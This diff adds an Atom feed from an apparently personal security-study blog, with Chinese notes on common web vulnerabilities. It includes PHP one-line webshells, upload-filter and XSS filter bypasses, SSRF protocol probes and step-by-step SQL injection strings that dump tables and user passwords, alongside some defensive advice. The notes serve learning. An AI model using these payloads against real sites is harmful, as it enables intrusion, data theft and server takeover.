@@ -1,0 +1,371 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://hellow-word578.github.io</id>
+    <title>...</title>
+    <updated>2023-03-23T07:59:11.770Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://hellow-word578.github.io"/>
+    <link rel="self" href="https://hellow-word578.github.io/atom.xml"/>
+    <subtitle>...</subtitle>
+    <logo>https://hellow-word578.github.io/images/avatar.png</logo>
+    <icon>https://hellow-word578.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2023, ...</rights>
+    <entry>
+        <title type="html"><![CDATA[文件上传]]></title>
+        <id>https://hellow-word578.github.io/post/wen-jian-shang-chuan/</id>
+        <link href="https://hellow-word578.github.io/post/wen-jian-shang-chuan/">
+        </link>
+        <updated>2022-06-23T07:56:55.000Z</updated>
+        <content type="html"><![CDATA[<pre><code>• 漏洞原理
+</code></pre>
+<p>大部分的网站和应用系统都有上传功能，而程序员在开发文件上传功能时，并未考虑文件格式后缀的合法性校验或者是否只在前端通过js进行后缀检验。</p>
+<p>这时攻击者可以上传一个与网站脚本语言相对应的恶意代码动态脚本，例如(jsp、asp、php、aspx文件后缀)到服务器上，从而访问这些恶意脚本中包含的恶意代码，进行动态解析最终达到执行恶意代码的效果，进一步影响服务器安全。</p>
+<p>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。一般都是指“上传Web脚本能够被服务器解析”的问题。<br>
+• 漏洞危害</p>
+<p>可能会导致用户信息泄露，被钓鱼，甚至使攻击者可以直接上传WebShell到服务器，进而得到自己想要的信息和权限。最终达到对数据库执行、服务器文件管理、服务器命令执行等恶意操作，甚至完全控制服务器系统。</p>
+<p>webshell：运行在web应用之上的远程控制程序 。 webshell分为大马、小马等。功能简易的webshell称为小马，拥有较完整功能的webshell，称为大马。</p>
+<p>一句话木马：<br>
+<img src="https://hellow-word578.github.io/post-images/1679558253859.png" alt="" loading="lazy"></p>
+<?php @eval($_POST[a]); ?>
+<script language='php'>@eval($_POST['a']);</script>
+<pre><code>• 文件上传漏洞绕过方式：
+更改这个Content-Type为image/jpeg，即是我们上传的文件格式绕过，这里PHP格式也不行，       一直试到phtml可以（绕过后缀的有文件格式有php,php3,php4,php5,phtml.pht）
+.phtml是PHP 2程序的标准文件扩展名.
+![](https://hellow-word578.github.io/post-images/1679558285404.png)
+	1、前端绕过，抓包修改后缀名，
+
+2、文件内容绕过，用图片马，抓包修改后缀绕过
+
+3、黑名单绕过,那么我们可以改成phtml抓包绕过
+
+4、.htaccess绕过，只要有这个配置文件，并且内容为“AddType application/x-httpd-php .jpg(就是把所以jpg后缀的文件全都当作php文件来执行)”
+
+5、大小写绕过，抓包后修改后缀为.PHp
+
+7、空格绕过，抓包修改后缀，在后缀后面加上空格
+
+8、点绕过，抓包修改后缀，在后缀后面加上点(删掉空格还可以. .或者 . )
+
+9、文件流绕过，前提条件，必须是window的服务器，抓包修改后缀，并在后缀后面加上::$DATA,
+
+10、双拼绕过，抓包修改后缀，并在把后缀改成pphphp，这样后端去掉php，还剩下个p和hp组合在一起，又是php
+
+
+11、.user.ini配置文件绕过
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[越权漏洞]]></title>
+        <id>https://hellow-word578.github.io/post/yue-quan-lou-dong/</id>
+        <link href="https://hellow-word578.github.io/post/yue-quan-lou-dong/">
+        </link>
+        <updated>2022-05-29T06:27:43.000Z</updated>
+        <content type="html"><![CDATA[<pre><code>• 越权访问（Broken Access Control，简称BAC）是Web应用程序中一种常见的漏洞
+
+• 越权访问漏洞的产生
+</code></pre>
+<p>比如，某个订单系统，用户可以查询自己的订单信息。A用户查询订单时，发送的HTTP请求中包含参数orderid=A，订单系统取得orderid后最终会查询数据库，查询语句类似于select * from tablename where orderid = A。B用户查询订单时，发送的HTTP请求中包含参数orderid=B，系统查询数据库语句类似于select * from tablename where orderid = B。正常情况下，每个用户只会查询到自己的订单。但是，当B用户将自己的HTTP请求参数修改为orderid=A，那么最终B用户执行的数据库语句变成了select * from tablename whereorderid = A，导致A的订单信息被B用户获取到了。(小迪称为水平越权访问)<br>
+• 常见越权漏洞</p>
+<pre><code>- 通过修改GET传参来越权。
+
+- 修改POST传参进行越权。 
+
+- 修改cookie传参进行越权。
+
+- 抓取传参可以在浏览器、APP、应用程序exe 
+
+- 未授权访问。严格意义上而言这个不属于越权漏洞，但是在日常测试中常常会遇见。只要输入正确的网址就可以直接访问，例如/admin默认是登录，登录后跳转到user.php,然后你直接访问user.php，发现你直接有后台权限。
+
+- 业务逻辑绕过。
+</code></pre>
+<p>垂直越权<br>
+概述<br>
+权限较低的用户去执行高权限用户的操作。</p>
+<p>修复建议</p>
+<p>越权访问漏洞产生的主要原因是因为没有对用户的身份做判断和控制，防护这种漏洞是，可以使用session【当访问服务器某个网页的时候,会在服务器端的内存里开辟一块内存，这块内存就叫做`SESSION】来控制，例如用户在登录成功后， 将用户名写入session中，当用户查看个人信息时，通过session中取出username，而不是从GET或者POST中取到username，那么此时的username就不会被篡改了</p>
+<p>https://blog.csdn.net/m0_55854679/article/details/115276980?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167198249816782427422609%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=167198249816782427422609&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2<sub>all</sub>sobaiduend~default-2-115276980-null-null.142<sup>v68</sup>pc_new_rank,201<sup>v4</sup>add_ask,213<sup>v2</sup>t3_control2&amp;utm_term=web%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E&amp;spm=1018.2226.3001.4187</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CSRF漏洞]]></title>
+        <id>https://hellow-word578.github.io/post/csrf-lou-dong/</id>
+        <link href="https://hellow-word578.github.io/post/csrf-lou-dong/">
+        </link>
+        <updated>2022-05-23T07:30:38.000Z</updated>
+        <content type="html"><![CDATA[<p>什么是同源策略及其限制内容？<br>
+同源策略是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，浏览器很容易受到XSS、CSRF等攻击。同源是指&quot;协议+域名+端口&quot;三者相同，即便两个不同的域名指向同一个ip地址，也非同源。</p>
+<pre><code>• CSRF(Cross-site request forgery，跨站请求伪造)是指利用受害者尚未失效的身份认证信息（ cookie、会话等信息），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向服务器发送请求，从而完成非法操作（如转账、改密、信息修改等操作）。
+</code></pre>
+<p>CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用</p>
+<pre><code>• 一句话概括CSRF的危害：盗用受害者的身份，受害者能做什么，攻击者就能以受害者的身份做什么。
+</code></pre>
+<p>攻击者只有预测出URL的所有参数与参数值，才能成功地构造一个伪造的请求;反之，攻击者将无法攻击成功。<br>
+<img src="https://hellow-word578.github.io/post-images/1679556699365.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[反序列化漏洞]]></title>
+        <id>https://hellow-word578.github.io/post/fan-xu-lie-hua-lou-dong/</id>
+        <link href="https://hellow-word578.github.io/post/fan-xu-lie-hua-lou-dong/">
+        </link>
+        <updated>2022-05-19T07:11:44.000Z</updated>
+        <content type="html"><![CDATA[<p>__construct是创建对象后触发<br>
+__destruct是这个对象执行完毕后自动执行的，不需要用户写代码刻意触发<br>
+__wakeup是用户反序列化后自动触发，怎么反序列化？用unserialize()函数<br>
+__sleep是用户序列化的时候自动触发，怎么序列号？用serialize()函数</p>
+<pre><code>简单来说，如果反序列化方法执行的是我们特殊构造的字节序列，那么反序列化漏洞就发生了。
+</code></pre>
+<p>如果Java应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[文件操作之文件下载读取]]></title>
+        <id>https://hellow-word578.github.io/post/wen-jian-cao-zuo-zhi-wen-jian-xia-zai-du-qu/</id>
+        <link href="https://hellow-word578.github.io/post/wen-jian-cao-zuo-zhi-wen-jian-xia-zai-du-qu/">
+        </link>
+        <updated>2022-05-13T07:10:24.000Z</updated>
+        <content type="html"><![CDATA[<pre><code>• 原理
+</code></pre>
+<p>产生：任意语言代码下载函数<br>
+文件下载（一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞。）<br>
+<img src="https://hellow-word578.github.io/post-images/1679555463551.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[XXS]]></title>
+        <id>https://hellow-word578.github.io/post/xxs/</id>
+        <link href="https://hellow-word578.github.io/post/xxs/">
+        </link>
+        <updated>2022-05-11T06:44:26.000Z</updated>
+        <content type="html"><![CDATA[<!-- more -->
+<p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写&quot;CSS&quot;冲突，故又称XSS。一般XSS可以分为如下几种常见类型：<br>
+1.反射性XSS（get型，post型）;<br>
+2.存储型XSS;<br>
+3.DOM型XSS;</p>
+<p>XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。<br>
+XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。<br>
+形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。<br>
+因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:<br>
+输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;<br>
+输出转义：根据输出点的位置对输出到前端的内容进行适当转义;</p>
+<script>alert('xss')</script>
+<p>XSS绕过的姿势有很多取决于你的思路和对前端技术的掌握程度<br>
+XSS绕过-过滤-转换<br>
+0，前端限制绕过，直接抓包重放，或者修改html前端代码<br>
+1,大小写，比如: <SCRIPT> aLeRT(111)</sCRIpt><br>
+2，拼凑: &lt;scri<script> pt&gt; alert(111)&lt;/scri</script> pt&gt;<br>
+3，使用注释进行干扰: &lt;scri<!--test--> pt&gt; alert(111)&lt;/sc &lt;--test--&gt; ript&gt;</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[RCE代码及命令执行漏洞]]></title>
+        <id>https://hellow-word578.github.io/post/rce-dai-ma-ji-ming-ling-zhi-xing-lou-dong/</id>
+        <link href="https://hellow-word578.github.io/post/rce-dai-ma-ji-ming-ling-zhi-xing-lou-dong/">
+        </link>
+        <updated>2022-05-03T06:22:12.000Z</updated>
+        <content type="html"><![CDATA[<pre><code>• 产生原因
+</code></pre>
+<p>在Web应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用代码或命令执行执行函数去处理。如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将命令执行漏洞。</p>
+<pre><code>• RCE分为：代码执行、命令执行
+代码执行【危害：执行脚本代码】
+
+    脚本：PHP、Java、Python
+    产生：Web源码、中间件平台等
+    检测
+        白盒：代码审计
+        黑盒：漏洞扫描、公开漏洞、手工看参数值及功能点
+    防御：敏感函数禁用、变量过滤或固定、WAF产品
+
+命令执行【危害：执行系统命令】
+
+    系统：linux、windows
+    产生
+    检测：白盒、黑盒
+    防御：敏感函数禁用、变量过滤或固定、WAF产品
+
+• 漏洞形成条件： 可控变量、漏洞函数
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[文件包含]]></title>
+        <id>https://hellow-word578.github.io/post/wen-jian-bao-han/</id>
+        <link href="https://hellow-word578.github.io/post/wen-jian-bao-han/">
+        </link>
+        <updated>2022-04-29T03:16:17.000Z</updated>
+        <content type="html"><![CDATA[<pre><code>• 文件包含概述
+• 程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，无需再次编写，这种文件调用的过程一般被称为文件包含。
+• 文件包含，是一个功能。 在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中，提供了：
+
+   include(),include_once(), require(),require_once(）
+
+这些文件包含函数，这些函数在代码设计中被经常使用到。
+• 漏洞产生原因
+web应用实现了动态包含
+动态包含的文件路径参数，客户端可控
+文件包含并不属于漏洞，但是，由于对包含进来的文件不可控，导致了文件包含漏洞的产生。这个漏洞非常严重，一句话木马过不了安全狗（安全产品），但通过文件包含漏洞可以
+
+
+大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击者会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况
+</code></pre>
+<p>和SQL注入等攻击方式一样，文件包含漏洞也是一种“注入型漏洞”，其本质就是输入一段用户能够控制的脚本或者代码，并让服务器端执行。</p>
+<p>什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程就叫做包含。</p>
+<p>有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。</p>
+<p>以PHP为例，常用的文件包含函数有以下四种：</p>
+<p>include()，require()，include_once()，require_once()</p>
+<figure data-type="image" tabindex="1"><img src="https://hellow-word578.github.io/post-images/1679552490887.png" alt="" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[SSRF漏洞]]></title>
+        <id>https://hellow-word578.github.io/post/ssrf-lou-dong/</id>
+        <link href="https://hellow-word578.github.io/post/ssrf-lou-dong/">
+        </link>
+        <updated>2022-04-23T06:05:58.000Z</updated>
+        <content type="html"><![CDATA[<p><img src="https://hellow-word578.github.io/post-images/1679551605635.png" alt="" loading="lazy"><br>
+比如,黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器</p>
+<pre><code>• SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。
+    一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为     
+</code></pre>
+<p>它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
+<pre><code>• SSRF漏洞利用（危害）
+</code></pre>
+<p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>
+<p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p>
+<p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p>
+<p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p>
+<p>5.利用file协议读取本地文件等。.</p>
+<p>6.各个协议调用探针：http,file,dict,ftp,gopher等</p>
+<p>http:192.168.64.144/phpmyadmin/<br>
+file:///D:/www.txt<br>
+dict://192.168.64.144:3306/info<br>
+ftp://192.168.64.144:21</p>
+<pre><code>• 目前常见的漏洞挖掘方式有两种：
+</code></pre>
+<p>1、从web功能上挖掘<br>
+①分享：通过url地址分享网页内容<br>
+②转码服务<br>
+③在线翻译<br>
+④图片的下载与加载<br>
+⑤图片、文章收藏功能<br>
+⑥未公开的API实现及调用URL的功能　　　　　　　　　　　　　　　　　　　　　　　　<br>
+2、从URL关键字挖掘<br>
+Share、wap、url、link、src、source、target、u、3g、display、sourceURL、imageURL、domain……<br>
+• SSRF防御</p>
+<p>SSRF漏洞的防御主要是保证用户请求的合法性、服务器行为的合规性两个方面。<br>
+1、限制请求端口只能为web端口，只允许访问HTTP和HTTPS的请求；<br>
+2、过滤返回的信息；<br>
+3、禁止不常使用的端口；<br>
+4、限制不能访问内网的IP，防止对内网进行攻击；<br>
+5、对于DNS重绑定，使用DNS缓存或者Host白名单。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[SQL注入]]></title>
+        <id>https://hellow-word578.github.io/post/sql-zhu-ru/</id>
+        <link href="https://hellow-word578.github.io/post/sql-zhu-ru/">
+        </link>
+        <updated>2022-04-21T11:51:55.000Z</updated>
+        <content type="html"><![CDATA[<p><strong>一、Sql注入简介</strong></p>
+<p>Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一。</p>
+<p><code>SQL注入漏洞的产生需要满足以下两个条件：</code><br>
+1、参数用户可控：前端传给后端的参数内容是用户可以控制的。<br>
+2、参数带入数据库查询：传入的参数拼接到SQL语句，并且带入数据库查询。</p>
+<p>url中?代表传值的意思，id代表变量，后面的&quot;=&quot;代表变量的值<br>
+联合查询union或者union all 只能用来执行查询语句，而堆叠注入可以用来执行任意的语句。</p>
+<p><code>Sql 注入带来的威胁主要有如下几点</code></p>
+<pre><code>猜解后台数据库，这是利用最多的方式，盗取网站的敏感信息。
+绕过认证，列如绕过验证登录网站后台。
+注入可以借助数据库的存储过程进行提权等操作
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://hellow-word578.github.io/post-images/1679547544389.png" alt="" loading="lazy"></figure>
+<p><code>数字型：</code></p>
+<p>当输入的参数为整形时，若存在注入漏洞，则是数字型注入。</p>
+<p>如：https://blog.csdn.net/aboutus.php?id=1</p>
+<p>此时后台语句：$sql=“SELECT 123 FROM abc WHERE id='1 '&quot;</p>
+<p>检测方法：URL输入 and 1=1 / and 1=2 报错则说明有注入<br>
+<code>字符型</code></p>
+<p>当输入参数为字符串时，称为字符型注入。</p>
+<p>它与数字型的区别：数字型不需要单引号来闭合，而字符串需要单引号来闭合。</p>
+<p>例：https://blog.csdn.net/aboutus.php?id=1’</p>
+<p>此时后台语句：$sql=“SELECT 123 FROM abc WHERE id='1 ’ ’ &quot;</p>
+<p>此时多出了一个单引号，破坏了原本的SQL语句结构，数据库无法处理，于是会报错，证明这条语句成功被带进数据库查询,存在字符型注入。</p>
+<p>此时通过 --+把后面的单引号注释掉，SQL语句也会形成闭合。</p>
+<p>所以我们可以这样：</p>
+<p>?id = 1’ 攻击语句 --+</p>
+<p>传入页面就变成了</p>
+<p>select user from database where id = ‘1’ 攻击语句 – ’</p>
+<p>–+：起注释作用，将后面的语句注释掉，在url中+相当于空格，–是注释符号，单行注释，之所以要加+号是因为–与单引号连在一起无法起注释作用因此必须把它们隔开<br>
+联合查询注入</p>
+<p>联合查询适合于有显示位的注入，即页面某个位置会根据我们输入的数据的变化而变化。</p>
+<pre><code>页面观察
+</code></pre>
+<p>输入id=1和id=2，若页面中值有变化，说明输入与数据库有交互</p>
+<pre><code>注入点判断
+</code></pre>
+<p>直接输入?id=1’若有报错则存在注入，开始判断可以从哪里注入，?id=2’1=2–+页面显示不正常，说明此处存在SQL注入，注入点在引号。</p>
+<p>接下来开始使用SQL语句进行攻击。</p>
+<pre><code>使用order by判断当前表的字段个数
+</code></pre>
+<p>例：?id=1 order by n --+</p>
+<p>若n超过当前表的列数，就会报错，说明表中只有n-1列</p>
+<pre><code>判断显示位
+</code></pre>
+<p>判断显示位时，要使用 ?id=-1 或者改为0 让前面的select语句查询为空错误，然后采用后面的select语句去查询：</p>
+<p>?id=-1’ union select 1,2,3 --+</p>
+<p>观察页面在哪里回显我们的输入，就可以用那个地方测试接下的语句。</p>
+<pre><code>爆数据库的名字
+</code></pre>
+<p>?id=1’ union select 1,database(),3 --+</p>
+<p>在之前回显2的地方会回显database数据库的名字。</p>
+<pre><code>爆数据库中的表
+</code></pre>
+<p>?id=1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</p>
+<p>数据库语句懒得解释了。</p>
+<pre><code>爆表中的字段
+</code></pre>
+<p>?id=1’ union select 1,group_concat(column_name),3 from information_schema.column where table_schema=’爆出来的数据库名‘ and table_name=‘爆出来的表名’ --+</p>
+<pre><code>爆相应字段的所有数据
+</code></pre>
+<p>?id=-1’ union select 1,group_concat(id,’–‘,username,’–',password),3 from users --+<br>
+报错注入</p>
+<p>含义：就是在mysql中使用指定函数来制造报错，查询的时候加一些格式错误的信息，它会提示你格式错误，可以在中间加入一些其他信息，比如select database(),报错信息后面也会出现数据库信息.</p>
+<p>报错注入：利用数据库的报错信息得到数据库的内容。因此需要构造语句让数据库报错。</p>
+<p><code>三种报错注入的方法：</code><br>
+group by 重复健冲</p>
+<p>and (select 1 from (select count(*),concat((select 查询的内容 from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.table group by x)a) --+</p>
+<p>extractvalue()函数<br>
+?id=1' and extractvalue(1,concat('^',(select database()),'^')) --+//获取数据库名</p>
+<p>extractvalue(xml_frag,xpath_expr)；</p>
+<p>函数接受两个参数，第一个为XML标记内容，也就是查询的内容，第二个为XPATH路径，也就是查询的路径。</p>
+<p>如果没有匹配的内容，不管出于何种原因，只要路径有效并且查询的内容由正确嵌套和关闭的元素组成，返回空字符串。</p>
+<p>但如果路径写入错误格式，就会报错并且返回我们写入的非法内容。</p>
+<p>updatexml()函数<br>
+updatexml(xml_target,xpath_expr,new_xml)；</p>
+<p>此函数将XML标记的给定片段的单个部分替换为xml_target新的XML片段new_xml，然后返回更改的XML。</p>
+<p>xml_target替换的部分 与xpath_expr 用户提供的XPath表达式匹配。如果未xpath_expr找到表达式匹配 ，或者找到多个匹配项，则该函数返回原始 xml_targetXML片段。</p>
+<p>所有三个参数都应该是字符串。与extractvalue()类似，如果XPATH写入错误格式，就会报错，并且返回我们写入的非法内容。</p>
+<p>回显注入</p>
+<p>回显注入：利用注入漏洞可以改变页面返回数据。<br>
+基于布尔的盲注</p>
+<p>布尔盲注：即在页面不显示数据，只显示对错，此时我们输入的语句让页面呈现两种状态，相当于true和false，根据这两种状态判断我们输入的语句是否查询成功。</p>
+<p>因此需要构造判断语句，根据页面是否回显证实猜想。</p>
+<p>一般用到的函数：</p>
+<p>ascii()、 substr()、length()、exists()、concat()等。</p>
+<p>**substr(strings|express,m,[n])**函数：</p>
+<p>strings|express ：被截取的字符串或字符串表达式</p>
+<p>m 从第m个字符开始截取</p>
+<p>n 截取后字符串长度为n</p>
+<p>concat()函数：concat ()方法用于连接两个或多个数组。用于输出在页面中。</p>
+<p>步骤：</p>
+<pre><code>判断数据库类型
+</code></pre>
+<p>数据库可能的类型：</p>
+<p>MySQL、 access、 SQL sever 、information_schema.tables、msysobjects、sysobjects</p>
+<pre><code>判断数据库名（数据库名长度、每个ASCII值）
+判断库中的表名（表的个数、每个表名的长度和表名的ASCII）
+</code></pre>
+]]></content>
+    </entry>
+</feed>
